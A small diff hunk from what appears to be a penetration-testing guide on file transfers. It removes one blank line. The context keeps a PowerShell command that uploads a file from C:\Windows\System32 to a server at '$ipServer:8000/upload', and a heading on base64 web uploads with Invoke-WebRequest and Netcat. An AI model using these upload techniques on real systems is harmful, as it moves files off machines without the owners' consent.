@@ -297,7 +297,6 @@ Invoke-FileUpload -Uri http://$ipServer:8000/upload -File C:\Windows\System32\dr
 
 ```
 
-
 #### PowerShell Base64 Web Upload
 
 Another way to use PowerShell and base64 encoded files for upload operations is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat.
